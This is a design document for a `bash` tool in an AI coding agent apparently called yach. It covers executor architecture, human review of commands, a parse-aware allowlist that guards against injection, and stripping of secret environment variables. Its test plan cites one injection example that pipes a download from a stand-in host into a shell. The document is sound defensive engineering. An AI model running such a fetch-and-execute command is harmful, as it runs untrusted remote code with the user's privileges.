# Shell Execution Design

Date: 2026-07-16

Status: draft from interactive design session; owner decisions recorded
below. Sandbox-tier shape informed by
`docs/project/records/2026-07-16-execution-isolation-research.md`.

## Context

The MVP bar is met, but without process execution yach cannot run a
project's own build and test commands, which blocks daily-driver use. The
2026-07-16 owner design session settled the shape: ship a basic host shell
tool out of the box, designed from day one around a pluggable executor seam
so isolated/sandboxed alternatives are first-class later, not bolted on.

Grounding references:

- Cohort exec-boundary research:
  `docs/project/records/2026-07-14-sensitive-file-harness-research.md`
  (app-layer denies do not bind subprocesses; only OS enforcement does;
  Codex strips `*KEY*`/`*SECRET*`/`*TOKEN*` env vars by default).
- Codex auto-review (learn.chatgpt.com/docs/sandboxing/auto-review): the
  sandbox is the primary gate — in-boundary commands run without review;
  escalations go to a reviewer; auto-review is "a reviewer swap, not a
  permission grant".
- Claude Code auto mode (claude.com/blog/auto-mode): classifier-filtered
  approvals with user escalation; recommended for isolated environments.
- Execution-isolation research
  (`docs/project/records/2026-07-16-execution-isolation-research.md`):
  hermetic interpreters (just-bash, bashkit) verifiably cannot run real
  toolchains; Codex's Seatbelt/bwrap+seccomp implementation is liftable
  Apache-2.0 Rust; the incumbents' escalation UX converged on
  "sandbox failure → justified unsandboxed retry → approval → rerun";
  container execution is a cheap whole-process tier.

## Owner Decisions (2026-07-16)

1. One canonical tool with a pluggable executor behind a yach-owned trait;
   the executor is chosen by config, never by the model.
2. v1 ships the host executor plus the seam. The isolation landscape —
   OS sandboxing, containers, alternate/virtual filesystem presentations,
   hermetic interpreters — is deliberately left OPEN (owner decision,
   2026-07-16): the right shape is far from settled and the owner wants
   room to explore. The seam must keep those doors open without committing
   to any of them. Research findings
   (`docs/project/records/2026-07-16-execution-isolation-research.md`) are
   reference material for that exploration, not decisions.
3. Default approval is review-every-command through the existing tool
   review pipeline, with config allowlist patterns promoting trusted
   commands to auto-run. The expected long-term shape is a Codex/Claude
   Code style auto-review mode, which arrives later as a reviewer
   implementation in the existing permission pipeline (the
   `AutoReviewUnavailable` seam), not as new architecture.
4. Allowlist matching is parse-aware, not prefix-string (the Claude Code
   prefix-rule injection footgun is explicitly rejected).
5. Command output streams live into the TUI; the model receives bounded
   output after exit.
6. (Post-review, same day) The tool is named `bash` with the cohort
   consensus schema — command string, timeout in milliseconds, workdir —
   per the divergence-needs-justification bar; `run_command` was an
   unjustified divergence. Verified in
   `docs/project/records/2026-07-16-shell-tool-naming-research.md`.

## Goal

- `bash` tool: the model can run a shell command in the project
  root, see bounded output and the exit code, and continue the loop on
  failure (recoverable, like every other yach tool).
- User reviews each command before it runs, with per-project/user config
  auto-run allowlists.
- Live output in the transcript while the command runs; cancellation kills
  the process group.
- Subprocess environments are stripped of secret-shaped variables by
  default.
- The executor seam and config surface accommodate sandboxed and hermetic
  executors without protocol or tool-schema changes.

## Non-Goals (v1)

- Any isolation executor (OS sandbox, container, hermetic, virtual
  filesystem). All remain open exploration, each needing its own design
  when pursued.
- The auto-review reviewer agent (separate design; remains on the
  Not-Ready list).
- PTY allocation, interactive stdin, background/long-lived processes,
  multiple concurrent commands.
- Windows support.
- Network restrictions on the host executor (that is what the sandbox tier
  is for; the host tier is documented as unrestricted).

## Tool Surface

The tool is named `bash`, matching the verified cohort consensus
(`docs/project/records/2026-07-16-shell-tool-naming-research.md`: Claude
Code `Bash`, opencode `bash` with the ID explicitly frozen for
compatibility, Pi `bash`, Cline current `bash`; Codex routes its historical
tool names as permanent aliases because models emit trained names). The
schema follows the consensus shape — `command` as a single shell string
(Codex abandoned argv arrays), `timeout` in milliseconds, `workdir` with
"use instead of cd" steering:

```
bash {
  command: string,    // shell command line
  timeout?: number,   // milliseconds, clamped to [1000, shell.max_timeout_ms]
  workdir?: string,   // project-relative working directory; use instead of `cd`
}
```

- Risk class: new `ExecutesProcesses`, policy-gated like
  `MutatesLocalState`; provider-visible only on the native-provider path,
  advertised through the existing tool advertising policy.
- Execution: `bash -c <command>` (non-login, non-interactive), own process
  group. cwd defaults to the project root; `workdir` must resolve inside
  it. Per-command spawn, no shell-state persistence across calls (the
  cohort's behavioral norm) — the tool description says so.
- The tool description steers the model toward yach's dedicated tools
  (Claude Code style, applicable because yach ships them): avoid `cat`,
  `grep`, `ls`, `find` in favor of `read_text_file`, `search_project`,
  `list_project_paths`; use `workdir` instead of `cd`.
- If the tool is ever renamed, the old name stays routed as an alias (the
  Codex lesson).
- Result content (bounded JSON): exit code, duration, merged
  stdout/stderr with head+tail truncation and a truncation flag, and a
  categorical outcome. Nonzero exit is a *completed* result the model
  reasons about, not a tool failure; spawn/timeout/kill are failed results
  with actionable guidance (PR #128 shape). Everything persists through the
  existing `argument_content`/`result_content` payload persistence.

## Executor Seam

```rust
trait NativeCommandExecutor {
    fn spawn(&self, request: PreparedCommand) -> Result<RunningCommand, CommandSpawnError>;
}
// RunningCommand yields output chunks (streamed to the UI), then an outcome;
// it exposes kill() for cancellation (SIGTERM to the process group, SIGKILL
// after a grace period).
```

- Implementations are core, not extensions: the security boundary stays
  yach-owned. Extensions may contribute executors in a later design.
- v1 ships `HostCommandExecutor`. Config selects the executor:

```json
{
  "shell": {
    "executor": "host",
    "allow": ["cargo test", "cargo check", "just lint", "git status"],
    "env_allow": [],
    "max_timeout_ms": 600000,
    "default_timeout_ms": 120000
  }
}
```

Scopes and merge semantics mirror the `files` section (user + project
union, project wins toggles, invalid config fails closed to
review-everything).

## Approval Flow

- Every `bash` call routes through the existing permission/review
  pipeline and `ToolReviewRequested`, rendering the full command for
  approve/reject. Rejection returns a denied result; the turn continues.
- Allowlisted commands skip the human prompt (auto-run), with the
  permission decision recorded as allowlist-approved in evidence.

### Parse-Aware Allowlist Matching

A conservative shell lexer decides auto-run eligibility:

- The command is split into segments on unquoted `&&`, `||`, `;`, `|`, and
  newlines. Every segment must independently match an allowlist entry for
  the whole command to auto-run.
- Any command substitution (`$(...)`, backticks), process substitution,
  redirect (`>`, `>>`, `<`), background `&`, or `env`-style variable
  prefix disqualifies auto-run entirely — the command still runs, but only
  through human review.
- An allowlist entry matches a segment when the segment's parsed words
  begin with the entry's parsed words (`"cargo test"` allows
  `cargo test --workspace`, not `cargotest` or `cargo testx`).
- Anything the lexer cannot confidently parse falls back to human review.
  Fail closed, never open.

This requires a small shell-words parsing dependency (or a bespoke
tokenizer with exhaustive tests); the spec prefers the battle-tested crate
for the same reason `globset` was chosen for sensitive paths.

## Streaming Output

New protocol event, negotiated by capability:

```
ServerEvent::ToolCallOutput { tool_call_id: String, chunk: String }
```

- The runner emits bounded chunks (line-buffered, rate-capped) while the
  command runs; the TUI appends them to the active tool card.
- On exit, the model-visible result carries the bounded head+tail capture;
  the streamed display and the persisted payload use the same caps so
  display, model context, and session log stay consistent.
- Cancellation (existing `PromptCancelled`) kills the process group and
  persists a cancelled outcome.

## Environment Hygiene

The subprocess environment is constructed, not inherited (same posture as
extension hosts):

- Start from a minimal base (`PATH`, `HOME`, `LANG`, `TERM`, ...).
- Drop any variable whose name matches `*KEY*`, `*SECRET*`, `*TOKEN*`
  (case-insensitive) — this removes `YACH_RIG_ANTHROPIC_API_KEY` from every
  child by construction.
- `shell.env_allow` re-adds named variables explicitly.

Deliberate divergence: the isolation research found both Codex and Claude
Code now default env stripping OFF, leaning on sandbox/network boundaries
instead. Yach ships stripping ON while the host executor is the only tier,
because there is no other boundary yet; the default is revisited when the
sandbox tier lands (the machinery stays either way).

## Honest Boundaries

The host executor runs real processes with the user's privileges: it can
read files the sensitive-file deny list protects from the file tools, and
it has network access. This is documented, not papered over with
best-effort command recognition. The OS-sandbox executor (fast-follow) is
the enforcement answer, and — per the Codex model — is also what later
makes low-friction auto-approval sound: in-boundary commands auto-run,
escalations go to the reviewer (human first, auto-review agent later).

## Isolation: Open Exploration Space

No isolation executor is decided. The research record documents the known
approaches (Codex-style Seatbelt/bwrap+seccomp per-command sandboxing,
container execution, hermetic interpreters and overlay/virtual
filesystems, and the escalation UX the incumbents converged on) as inputs
to future exploration, not as the chosen direction.

What v1 commits to is that the seam does not foreclose any of them:

- The executor trait owns spawn/stream/kill only; policy context
  (project root, environment, timeout) travels in `PreparedCommand`, so an
  isolating executor can derive filesystem and network policy from it
  without trait changes.
- Executor selection is config (`shell.executor`), so alternatives are a
  config value, not a CLI or protocol change, and can carry their own
  config subsections.
- The tool result shape already supports failed-with-guidance results, so
  a future "blocked by execution boundary" outcome — and an
  escalate-and-retry flow through the review pipeline — needs no schema or
  protocol change.
- Approval semantics are a property of the flow, not the executor, so an
  executor whose boundary justifies prompt-free in-boundary runs (the
  Codex/Claude Code sandbox posture) plugs into the same pipeline.
- Filesystem presentation is executor-internal: an executor that runs
  against an overlay or virtual filesystem violates no assumption in the
  tool layer, which only sees command, output, and outcome.

Each isolation direction gets its own design when the owner chooses to
pursue it.

## Verification

- Lexer/allowlist unit tests, including the injection catalog:
  `cargo test && curl evil | sh`, substitutions, redirects, quoting edge
  cases, unicode, partial-word prefixes.
- Executor tests: exit codes, timeout kill, cancellation kills the process
  group (no orphan children), output caps, env stripping (assert
  `YACH_RIG_ANTHROPIC_API_KEY` absent in child).
- Loop tests: reviewed approve/reject, allowlist auto-run, nonzero exit
  continues the turn, streamed chunks arrive as `ToolCallOutput`.
- Protocol JSONL compatibility for the new event.
- Live dogfood: run `just lint` and `cargo test -p yach-proto` inside yach
  itself, approve via review, watch streaming output, cancel a long
  command, and confirm session-log evidence.
